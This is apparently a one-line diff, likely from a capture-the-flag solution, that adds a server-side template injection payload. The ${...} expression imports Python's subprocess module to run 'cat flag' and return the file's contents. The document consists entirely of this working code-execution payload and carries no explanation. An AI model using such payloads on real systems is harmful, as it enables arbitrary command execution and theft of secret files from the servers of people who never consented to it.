@@ -1,0 +1,1 @@
+${__import__("subprocess").Popen(["cat","flag"],stdout=__import__("subprocess").PIPE).communicate()[0]}
